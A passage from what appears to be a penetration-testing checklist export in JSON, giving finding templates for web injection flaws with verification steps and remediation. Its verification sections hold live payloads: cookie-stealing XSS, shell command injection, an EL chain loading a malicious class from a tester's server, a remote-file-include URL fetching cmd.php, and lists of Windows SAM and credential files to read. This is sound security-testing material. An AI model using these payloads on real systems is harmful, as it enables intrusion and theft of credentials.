engine.</p><p>4. Show the HTTP request in which you exploit the templating engine by submitting a payload and achieving some form of remote code execution. A simple example could be retrieving the username running the server (<pre><code>whoami</code></pre>) or the user/group information (<pre><code>id</code></pre>). You could also try retrieving information from <code>/etc/passwd</code> or <code>.ssh/id_rsa</code>.</p><p><strong>References:</strong></p><p>- https://portswigger.net/web-security/server-side-template-injection</p><p>- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</p>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Wherever possible, avoid creating templates from user input. Passing user input into templates as parameters is normally a safe alternative.</p><p>If supporting user-submitted templates is a business requirement, consider using a simple logic-less template engine such as Mustache or one provided by the native language like Python's Template. If this is not an option, review the chosen template engine's documentation for hardening advice, and consider rendering the template within a sandboxed execution environment.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a1c01b66-4241-450a-bb81-deacaca5ce5d",
						"name": "Client-Side Template Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17059492,
							"uid": "c33253dd-b29f-e611-80eb-ecf4bbd04073",
							"name": "Client-Side Template Injection",
							"description": "<p>Client-side template injection vulnerabilities occur when user input (template expressions) can be embedded in a web page without any sanitization. When the framework evaluates any template expressions in the page, the user input will also be evaluated as a template expression. One example of a template framework is AngularJS. A malicious user could use template injection to inject input designed to bypass the Angular framework sandbox to execute cross-site scripting attacks. Since the input can potentially bypass the framework sandbox, the cross-site scripting will be executed.</p>",
							"severityId": 2,
							"businessImpact": "<p>Successful exploitation of client-side template injections can allow an attacker to perform cross-site scripting attacks. Cross-site scripting allows an attacker to run arbitrary script code in the context of the affected user. This could lead to the compromise of session cookies and user sessions.</p>",
							"sourceIdentifier": "BUR:2097928",
							"verificationInstructions": "<p>http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</p><p>1. Check if the app is sanitizing template expression syntax. For Angular, this is: {{1+1}}. Double curly braces.</p><p>&lt;input type=\"hidden\" name=\"im vulnerable\" id=\"vulnerable param\" value=\"<strong><span style=\"color: #DB2719\">i20v0{{a=(7&#42;7.0)}}a9cf7</span></strong>\" /&gt;</p><p>2. Confirm that the reflection/embed point is a (Angular) template. Look for script includes like \"AngularUICommonsJS\".</p><p>3. Look for the \"ng-app\" expression in the DOM tree. It can be in the root HTML or body tag.</p><p><strong><span style=\"color: #DB2719\">&lt;div ng-app</span></strong>=\"clone.translate.exam.ui\" ng-controller=\"ModalController\"&gt;</p><p>4. Confirm version of Angular JS. This is needed to escape the sandbox to execute xss. Visit below for full list of bypasses.</p><p>http://blog.portswigger.net/2016/04/adapting-angularjs-payloads-to-exploit.html</p>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Do not allow user input to be embedded or reflected into client-side templates. Filter out all user input that contains template expression syntax.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "bd21721f-234b-4f17-8613-ac23fd0a0d4a",
						"name": "Cross-Site Scripting - DOM Based",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051556,
							"uid": "659e972c-f9e3-e211-ba22-001e4f12001e",
							"name": "Cross-Site Scripting - DOM Based",
							"description": "<p>DOM-based cross-site scripting was discovered within the application. In DOM-based XSS, the client performs the injection of XSS into the page, as opposed to other XSS types (Reflected and Stored XSS) where the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script (such as JavaScript) that is sent to the client and performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data, and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</p><p>The following code snippet (age.html) demonstrates a DOM Cross-Site Scripting vulnerability:</p><pre><code>&lt;HTML&gt;\n    \t&lt;BODY&gt;\n    \t\tHello!\n    \t\t&lt;BR&gt;\n    \t\tYour age is: \n    \t\t&lt;SCRIPT&gt;\n    \t\t\tvar position=document.URL.indexOf(\"age=\")+4;\n    \t\t\tdocument.write(document.URL.substring(position,document.URL.length));\n    \t\t&lt;/SCRIPT&gt;\n    \t&lt;/BODY&gt;\n&lt;/HTML&gt;</code></pre><p>Normally, this HTML page would be used for presenting the user's age, e.g.: </p><pre><code>http://SERVER/age.html?age=21</code></pre><p>However, issuing the following request will result in an XSS condition:</p><pre><code>http://SERVER/age.html?age=&lt;script&gt;alert(document.cookie)&lt;/script&gt; </code></pre><p>Note there is no need for malicious code to be embedded in the server's response for the attack to succeed.</p>",
							"severityId": 2,
							"businessImpact": "<p>Successful exploitation of cross-site scripting vulnerabilities allows an attacker to run arbitrary script code in the context of the affected user. This can be used to compromise the integrity of content returned by the web server to take over a user's session, redirect the user to a malicious web site, or send requests on behalf of a user. Stolen sessions can be used to take any action the affected user could within an application.  Redirecting users to malicious web sites could be used to propagate malware, discredit the original web site, or trick users into disclosing sensitive information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.</p>",
							"sourceIdentifier": "M:659e972c-f9e3-e211-ba22-001e4f12001e",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>DOM XSS must be able to be weaponized - meaning a victim user must be able to trigger it; if this is not possible, then it is considered self-XSS. If you have <span style=\"color: red\"><strong>self-XSS</strong></span>, include this finding but downgrade to <strong>LOW</strong> (Score: 3.7 - Low • Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N)<span style=\"color: rgb(115, 116, 146); background-color: rgb(255, 255, 255)\"> </span>and include details in the Description.<br>If you are able to add HTML tags, but not exploit XSS, add the finding for <code>HTML Tag Injection</code>.</p><p><strong>Typical XSS vulnerabilities:</strong></p><ul><li><p>Standard &lt;script&gt; tag injection - <code>&lt;script&gt;alert(123)&lt;/script&gt;</code></p></li><li><p>Injection into existing JavaScript - <code>\";alert(123);//</code></p></li><li><p>Injection into input tags - use JavaScript event trigger such as <code>onmouseover=alert(123)</code></p></li></ul><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add screenshot of the initial page</p></li><li><p>Add text based HTTP request/response of the request with XSS payload. Use a modified HTTP request block if necessary.</p></li><li><p>Add screenshot of JavaScript executing in browser</p></li></ol>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/DOM_Based_XSS</li><li>https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Analyze and harden client side (JavaScript) code. Additionally, sanitize input sources which can be influenced by an attacker. For example:</p><ul><li><p>document.URL</p></li><li><p>document.URLUnencoded</p></li><li><p>document.location (and many of its properties)</p></li><li><p>document.referrer</p></li><li><p>window.location (and many of its properties)</p></li></ul><p>Special attention should be given to scenarios in which the DOM is modified. For example: </p><p>Write raw HTML, e.g.:</p><ul><li><p>document.write(...)</p></li><li><p>document.writeln(...)</p></li><li><p>document.body.innerHtml=...</p></li></ul><p>Directly modifying the DOM (including DHTML events), e.g.:</p><ul><li><p>document.forms[0].action=... (and various other collections)</p></li><li><p>document.attachEvent(...)</p></li><li><p>document.create...(...)</p></li><li><p>document.execCommand(...)</p></li><li><p>document.body. ... (accessing the DOM through the body object)</p></li><li><p>window.attachEvent(...)</p></li></ul><p>Replacing the document URL, e.g.:</p><ul><li><p>document.location=... (and assigning to location's href, host</p></li><li><p>and hostname)</p></li><li><p>document.location.hostname=...</p></li><li><p>document.location.replace(...)</p></li><li><p>document.location.assign(...)</p></li><li><p>document.URL=...</p></li><li><p>window.navigate(...)</p></li></ul><p>Opening/modifying a window, e.g.:</p><ul><li><p>document.open(...)</p></li><li><p>window.open(...)</p></li><li><p>window.location.href=... (and assigning to location's href, host</p></li><li><p>and hostname)</p></li></ul><p>Directly executing script, e.g.:</p><ul><li><p>eval(...)</p></li><li><p>window.execScript(...)</p></li><li><p>window.setInterval(...)</p></li><li><p>window.setTimeout(...)</p></li></ul><p>Consider the following vulnerable script:</p><pre><code>&lt;SCRIPT&gt;\nvar position=document.URL.indexOf(\"age=\")+4;\ndocument.write(document.URL.substring(position,document.URL.length));\n&lt;/SCRIPT&gt;</code></pre><p>In this example the age parameter isn't sanitized, therefore the script is susceptible to DOM Cross-Site Scripting attacks.</p><p>A safe version of this script would be:</p><pre><code>&lt;SCRIPT&gt;\n  var position=document.URL.indexOf(\"age=\")+4;\n  var age=document.URL.substring(position,document.URL.length);\n  if (age.match(/^[0-9]&#42;$/))\n  {\n        document.write(age);\n  }\n else\n {\n       window.alert(\"Illegal input.\\nAge parameter should be composed from numerical characters only.\");\n }\n&lt;/SCRIPT&gt;</code></pre><p>In this version, the age parameter is validated to make sure it does not contain malicious characters.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fef493ba-2ded-4d38-bceb-873609c7cb44",
						"name": "OS Command Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050858,
							"uid": "7ed62c1b-ac2d-e211-b92d-001e4f120032",
							"name": "OS Command Injection",
							"description": "<p>The application uses unsanitized user-controlled parameters to execute operating system commands. By injecting malicious characters into user input it is possible to execute arbitrary operating commands on the server.</p>",
							"severityId": 3,
							"businessImpact": "<p>By exploiting OS command injection, an attacker may be able to execute system commands on the affected host with the privileges of the affected service. In some circumstances this provides the means to take control of the server, leading to the complete compromise of the confidentiality, integrity, and availability of the affected host.</p>",
							"sourceIdentifier": "BUR:1048832",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>OS command execution always depends on the backend and the exploitation techniques can be very varied. </p><p>For simple OS command injection, attempt to inject special characters that can be used to execute multiple OS commands on a single line. These characters include semicolon, ampersand, pipe. Try to identify OS command execution from server errors or output.</p><p>Injection example if the server displays the results of the command (Linux/Unix):</p><p>id=doc.txt; ls /etc/</p><p>Injection example if blind command injection (Windows):</p><p>id=doc.txt &amp; ping pentester-ip</p><p>Blind injection can be detected (potentially) from time-delay or traffic.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the initial page</p></li><li><p>Show initial HTTP request</p></li><li><p>Show modified HTTP request that includes the OS command injection</p></li><li><p>Show the results</p></li></ol><p><strong>Further Testing</strong></p><ul><li><p>Attempt to compromise the server and associated servers (typically database server)</p></li><li><p>Include findings related to the configuration such as Excessive Privileges - Service Account</p></li></ul><p><strong>References</strong></p><ul><li><p>https://www.owasp.org/index.php/Command_Injection</p></li></ul>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/Command_Injection</li><li>https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allowlists using regular expressions.</p><p>If possible, do not implement dynamic server-side code (using methods such as <code>eval()</code>) that accepts user input.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4f0ba9c2-f2e1-40fb-aed1-3824fac91d94",
						"name": "EL Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5051344,
							"uid": "5ec0ca7b-a177-e211-bd95-001e4f12001e",
							"name": "EL Injection",
							"description": "<p>Expression Language injection vulnerabilities were found within the application. Expression Language allows JSP pages to easily access application data stored in user-defined JavaBeans components as well as the implicit objects. In addition, JSP pages can also invoke arbitrary public and static methods and perform arithmetic operations using EL expressions. EL injection vulnerabilities are introduced when an application fails to validate untrusted user data before assigning it to attribute values of certain Spring MVC JSP tags.</p><p>By allowing attackers to inject EL expressions through insufficiently validated user input, an application could grant unauthorized access to sensitive application and server information. EL injection could also let attackers bypass HTTPOnly access restrictions imposed on cookies by exploiting access to the implicit cookie object made available in EL expressions.</p>",
							"severityId": 3,
							"businessImpact": "<p>Successful exploitation of Expression Language injection could lead to information disclosure, bypass of HTTPOnly cookie access restriction, and remote code execution.</p>",
							"sourceIdentifier": "WI:11310",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>EL injection works when server evaluates EL expressions server-side. To extract sample data showing that EL injection works:</p><p>Arithmetic operations (should result in 246 in server response): ${123+123}</p><p>Application scope in server response: ${applicationScope}</p><p>Request scope in server response: ${requestScope}</p><p>JSESSIONID cookie value in server response: ${cookie[\"JSESSIONID\"].value}</p><p>Arbitrary parameter value in server response: ${param.&lt;guessed param name&gt;}</p><p>Remote code execution (tested in Glassfish, failed with IBM Websphere/Web Logic)</p><p>1. Upload Malicous.class to PENTEST WEB SERVER</p><p>2. Execute following 3 requests in order:</p><p>${pageContext.request.getSession().setAttribute(\"arr\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}</p><p>${pageContext.request.getSession().getAttribute(\"arr\").add(pageContext.getServletContext().getResource(\"/\").toURI().create(\"http://&lt;PENTEST WEB SERVER&gt;/\").toURL())}</p><p>${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute(\"arr\").toArray(pageContext.getClass().getClassLoader().getParent).getURLs())).loadClass(\"Malicious\").newInstance()}</p><p><strong>Reporting Requirements</strong></p><p>Screenshot the initial page</p><p>Show initial HTTP request</p><p>Show modified HTTP request that contains the EL injection</p><p>If command execution is possible, add details of what could be done</p><p>If no command execution,  show that the EL injection is evaluated server-side</p><p><strong>Further Testing</strong></p><p>if outbound connectivity - Insufficient Egress Filtering</p><p>if code execution with elevated privileges - Excessive Privileges - Service Account</p><p><strong>References</strong></p><p>http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</p>",
							"references": "<ul><li>https://mindedsecurity.com/wp-content/uploads/2020/10/ExpressionLanguageInjection.pdf</li><li>https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Avoid putting user data into an expression interpreter whenever possible. When it is necessary to do so, validate or encode the data to ensure it is not evaluated as expression language.</p><p>It is possible to disable this functionality in certain versions of the Spring framework. In Spring framework versions 3.1 and above it is disabled by default. For versions below 3.1 (3.0.6 onwards, 2.5.6.SEC03 onwards and 2.5.7.SR02 onwards), set the value of springJspExpressionSupport context parameter to false.</p><pre><code>&lt;context-param&gt;\n     &lt;description&gt;Spring Expression Language Support&lt;/description&gt;\n     &lt;param-name&gt;springJspExpressionSupport&lt;/param-name&gt;\n     &lt;param-value&gt;false&lt;/param-value&gt;\n&lt;/context-param&gt;</code></pre>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "de419e97-e2ac-4186-9f24-9cdde0b13b78",
						"name": "XPath Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 3389546,
							"uid": "5013723d-8a65-e011-b27a-001e4f120021",
							"name": "XPath Injection",
							"description": "<p>XPath injection vulnerabilities arise when user-controllable data is incorporated into XPath queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>",
							"severityId": 3,
							"businessImpact": "<p>Depending on the purpose for which the vulnerable query is being used, an attacker may be able to exploit an XPath injection flaw to read sensitive application data or interfere with application logic.</p>",
							"sourceIdentifier": "M:3389546",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>XPath injection often seems like a SQL injection; the same injections cause errors in the application or result in valid queries. Injecting single quote should result in an error, two single quotes should result in a valid query, and ' and 'a'='a should also result in a valid query. To determine that the injection is actually an XPath injection, try using XPath specific functions that result in valid queries such as</p><ul><li><p>' and string-length('aaa')=3 and 'a'='a</p></li><li><p>' and string-join(('aaa','bbb'))='aaabbb</p></li></ul><p>Data enumeration via XPath injection is very slow. Try XPath Blind Explorer. If it doesn't work, create a PoC injection that demonstrates susceptibility to XPath injection typically by causing an error message.</p><p>In rare cases XPath 2.0 is used. Try doc function to connect to external resources:</p><p>doc(concat(\"http://209.118.108.216/test\",'test')) </p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the initial page</p></li><li><p>Show initial HTTP request</p></li><li><p>Show modified HTTP request that contains the XPath injection</p></li><li><p>Show access to XML content that should not be accessible to the user or XPath errors caused by injections</p></li></ol><p><strong>Further Testing</strong></p><p>If doc function work, and if outbound connectivity, report insufficient egress filtering. Additionally, try capturing NTLM hashes.</p><p><strong>References</strong></p><p>https://www.owasp.org/index.php/XPATH_Injection</p><p>https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-WP.pdf</p><p><strong>Tools</strong></p><p>XPath Blind Explorer</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Strictly define the data type (for instance, a string, an alphanumeric character, etc.) that the application will accept to prevent data from being accessed inappropriately. Also, ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allowlists using regular expressions.</p><p>Disable detailed error messages that could give an attacker information about XPath query or XML format. Replace the error message with a generic error asking the user to contact the IT department or send an e-mail to the web administrator.</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "784483e9-e3f9-4149-8196-7e7cc1da49ba",
						"name": "LDAP Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5049996,
							"uid": "015e283c-f4b6-e111-8b5c-001e4f120021",
							"name": "LDAP injection",
							"description": "<p>LDAP injection arises when user-controllable data is copied in an unsafe way into an LDAP query that is performed by the application. If an attacker can inject LDAP metacharacters into the query, then they can interfere with the query's logic. Depending on the function for which the query is used, the attacker may be able to retrieve sensitive data to which they are not authorized, or subvert the application's logic to perform some unauthorized action.</p>",
							"severityId": 3,
							"businessImpact": "<p>An attacker may exploit this flaw to bypass authentication or authorization.  Depending on the permissions with which the LDAP query is performed, the breadth of this attack may be limited. But if the attacker can control the command structure of the query, such an attack could potentially affect all LDAP records accessible by the LDAP service account.</p>",
							"sourceIdentifier": "BUR:1049856",
							"verificationInstructions": "<h3>Verification Instructions:</h3><p>Identify parameters that could be used in LDAP queries. Login or search forms are the most typical uses for LDAP queries from web applications.</p><p>Attempt to cause errors or unexpected results by injecting LDAP special characters: ), (, |, &#42;, !, &amp;.</p><p>If LDAP injection detected, attempt to expand the query result set. Typical injections:</p><ul><li><p>)(ou=&#42;</p></li></ul><p>user=&#42;)(uid=&#42;))(|(uid=&#42;</p><p>%00 can sometimes be used to comment out the rest of the query (OpenLDAP).</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Screenshot the initial page</p></li><li><p>Show the normal HTTP request</p></li><li><p>Show LDAP injection in request parameter</p></li><li><p>Show the impact of LDAP injection - typically authentication bypass or information enumeration</p></li></ol><h3><strong>Tools:</strong></h3><p>If LDAP injection detected, LDAPBlindExplorer can be used to extract data:</p><ul><li><p>http://code.google.com/p/ldap-blind-explorer/</p></li></ul>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/LDAP_Injection</li><li>https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": null,
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of LDAP injection attacks:</p><ul><li><p>Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allowlisting should be used as the base validation method of user input; blocklisting can be used as an additional layer of protection.</p></li><li><p>Whenever possible, limit all client-supplied data to alphanumeric data. If non-alphanumeric characters must be used, encode them as before passing them to the underlying query.</p></li></ul>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7ac10a72-395a-4c74-a0a0-0345c98034ad",
						"name": "XML Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050075,
							"uid": "dfc5ce62-70bc-e111-8b5c-001e4f120021",
							"name": "XML Injection",
							"description": "<p>XML or SOAP injection vulnerabilities arise when user input is inserted into a server-side XML document or SOAP message in an unsafe way. It may be possible to use XML meta-characters to modify the structure of the resulting XML. Depending on the function in which the XML is used, it may be possible to interfere with the application's logic, to perform unauthorized actions or access sensitive data. This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response, and the purpose, which the relevant input performs within the application's functionality, to determine whether it is indeed vulnerable.</p>",
							"severityId": 3,
							"businessImpact": "<p>A remote attacker could leverage XML injection into a full compromise of integrity, availability, and confidentiality of the application depending on the XML code susceptible to the flaw.</p>",
							"sourceIdentifier": "BUR:1050368",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Inject XML tags into user input. XML injections can typically be identified from verbose error messages. Successful XML injection requires that the underlying DTD is known; successfully injecting XML that results in a valid XML call from web server to app server is difficult.</p><p>Sample injections:</p><p>id='</p><p>id=\"</p><p>id=&lt;</p><p>id=test&lt;/uid&gt;&lt;uid&gt;test2</p><p>It is very difficult to exploit XML injections for anything meaningful. XML injection can typically be identified from error messages that indicate that the backend XML structure was successfully modified.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the initial page</p></li><li><p>Show the initial HTTP request</p></li><li><p>Show the modified request containing the XML injection</p></li><li><p>Show effect of the XML injection (either error message or actual impact)</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure all user supplied data is proper sanitized before presenting it to any XML processing interfaces. Disable detailed error messages that could give an attacker information.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c878a985-e12d-4ec7-a7c7-70c9294ccceb",
						"name": "Arbitrary File Read",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21998,
							"uid": "905c0de5-52f9-dd11-908d-001e4f12001c",
							"name": "Arbitrary File Read",
							"description": "<p>It is possible to read arbitrary files on the affected systems.</p>",
							"severityId": 3,
							"businessImpact": "<p>The severity of this issue depends on the nature of the files accessible by exploiting the vulnerability. It may be possible to gain unauthorized access to application source code, system configuration information, or other sensitive data. This information could potentially be used in further attacks against the host.</p>",
							"sourceIdentifier": "WI:10271",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Test application functionality that can be used to access files, such as uploaded files, on the server using a complete path (such as C:\\inetpub\\wwwroot\\etc..) as a parameter value. Test if arbitrary paths are accepted as parameters to allow access to files that should not be accessible on the file system.</p><p>If directory traversal sequence is needed, report directory traversal instead of this.</p><p>Test outbound connectivity using UNC paths and HTTP URLs.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Screenshot the affected page</p></li><li><p>Show a request containing an absolute path</p></li><li><p>Modify request to access files that should not be accessible</p></li><li><p>Show the impact of the vulnerability</p></li></ol><h3><strong>Further Testing:</strong></h3><p>The following findings should be reported if applicable:</p><ul><li><p>Insufficient egress filtering</p></li><li><p>Cleartext passwords stored</p></li></ul><h3>Miscellaneous:</h3><p>Try to gain access to other files, such as /etc/passwd and /etc/shadow, or other known sensitive files depending on OS.</p><h3>Default windows path(s):</h3><p>C:/Users/Administrator/NTUser.dat</p><p>C:/Documents and Settings/Administrator/NTUser.dat</p><p>C:/apache/logs/access.log</p><p>C:/apache/logs/error.log</p><p>C:/apache/php/php.ini</p><p>C:/boot.ini</p><p>C:/inetpub/wwwroot/global.asa</p><p>C:/MySQL/data/hostname.err</p><p>C:/MySQL/data/mysql.err</p><p>C:/MySQL/data/mysql.log</p><p>C:/MySQL/my.cnf</p><p>C:/MySQL/my.ini</p><p>C:/php4/php.ini</p><p>C:/php5/php.ini</p><p>C:/php/php.ini</p><p>C:/Program Files/Apache Group/Apache2/conf/httpd.conf</p><p>C:/Program Files/Apache Group/Apache/conf/httpd.conf</p><p>C:/Program Files/Apache Group/Apache/logs/access.log</p><p>C:/Program Files/Apache Group/Apache/logs/error.log</p><p>C:/Program Files/FileZilla Server/FileZilla Server.xml</p><p>C:/Program Files/MySQL/data/hostname.err</p><p>C:/Program Files/MySQL/data/mysql-bin.log</p><p>C:/Program Files/MySQL/data/mysql.err</p><p>C:/Program Files/MySQL/data/mysql.log</p><p>C:/Program Files/MySQL/my.ini</p><p>C:/Program Files/MySQL/my.cnf</p><p>C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err</p><p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log</p><p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err</p><p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log</p><p>C:/Program Files/MySQL/MySQL Server 5.0/my.cnf</p><p>C:/Program Files/MySQL/MySQL Server 5.0/my.ini</p><p>C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf</p><p>C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf</p><p>C:/Program Files (x86)/Apache Group/Apache/conf/access.log</p><p>C:/Program Files (x86)/Apache Group/Apache/conf/error.log</p><p>C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml</p><p>C:/Program Files (x86)/xampp/apache/conf/httpd.conf</p><p>C:/WINDOWS/php.ini</p><p>C:/WINDOWS/Repair/SAM</p><p>C:/Windows/repair/system</p><p>C:/Windows/repair/software</p><p>C:/Windows/repair/security</p><p>C:/WINDOWS/System32/drivers/etc/hosts</p><p>C:/Windows/win.ini</p><p>C:/WINNT/php.ini</p><p>C:/WINNT/win.ini</p><p>C:/xampp/apache/bin/php.ini</p><p>C:/xampp/apache/logs/access.log</p><p>C:/xampp/apache/logs/error.log</p><p>C:/Windows/Panther/Unattend/Unattended.xml</p><p>C:/Windows/Panther/Unattended.xml</p><p>C:/Windows/debug/NetSetup.log</p><p>C:/Windows/system32/config/AppEvent.Evt</p><p>C:/Windows/system32/config/SecEvent.Evt</p><p>C:/Windows/system32/config/default.sav</p><p>C:/Windows/system32/config/security.sav</p><p>C:/Windows/system32/config/software.sav</p><p>C:/Windows/system32/config/system.sav</p><p>C:/Windows/system32/config/regback/default</p><p>C:/Windows/system32/config/regback/sam</p><p>C:/Windows/system32/config/regback/security</p><p>C:/Windows/system32/config/regback/system</p><p>C:/Windows/system32/config/regback/software</p><p>C:/Program Files/MySQL/MySQL Server 5.1/my.ini</p><p>C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml</p><p>C:/Windows/System32/inetsrv/config/applicationHost.config</p><p>C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</p>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</li><li>https://owasp.org/www-community/attacks/Path_Traversal</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that server-side controls are put in place that validate and restrict reading of files based on extensions, locations, and content to only that which is required for a defined business purpose.</p><p>If possible, implement strict input validation to prevent directory traversal. All user supplied data used by the application should be put through a data input filter that removes potentially harmful characters. Best practice for input validation recommends the use of allow lists using regular expressions.</p><p>A non-privileged service account which does not have any access outside of its limited web directory should be used to run the web server.</p>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c32b651d-bdc0-4d66-bb31-e5f7b15bfcb7",
						"name": "Remote File Include",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 488229,
							"uid": "641dcae7-cba4-de11-826f-001e4f120021",
							"name": "Arbitrary Remote File Include",
							"description": "<p>The application fetches and incorporates data from arbitrary sources supplied by an attacker to its normal operation.</p>",
							"severityId": 3,
							"businessImpact": "<p>The attacker can cause the application to fetch and display arbitrary URLs, thus allowing the attacker to feed specific information to the application for processing and display.  This may result in multiple issues, including cross-site scripting and operating system command execution.</p>",
							"sourceIdentifier": "WI:5151",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Try to inject external content to the site and determine whether the remote file is displayed as it or if it's executed on the server. If external content is executed server-side, try connecting to a pentesting server you control to fetch malicious file (such as malicious PHP file) that can be used to execute OS command on the server.</p><p>Sample:</p><p>http://website/article?include=http://&lt;pentestServerIP&gt;/cmd.php.</p><p>If external content is not executed, use the following finding:</p><ul><li><p>External Content Inclusion</p></li></ul><p><strong>Reporting Requirements</strong></p><ol><li><p>Include a description how the remote file include can be exploited</p></li><li><p>Show vulnerable page</p></li><li><p>Modify request to fetch external content</p></li><li><p>Show the impact, such as OS command execution</p></li></ol><p><strong>Further Testing</strong></p><p>Report the following if applicable:</p><ul><li><p>Insufficient egress filtering</p></li><li><p>Excessive privileges - service account</p></li><li><p>Any other vulnerabilities that can be identified via OS command execution</p></li></ul>",
							"references": "<ul><li>http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Implement a design policy that requires stringent definition of the values an application will accept and add logic to the application that enforces domain control when accepting a remote source as a valid parameter value. Unless required for a defined business requirement, use relative paths instead of full URIs when accepting client supplied parameters for data source.</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 5,
				"collapsed": true
			},
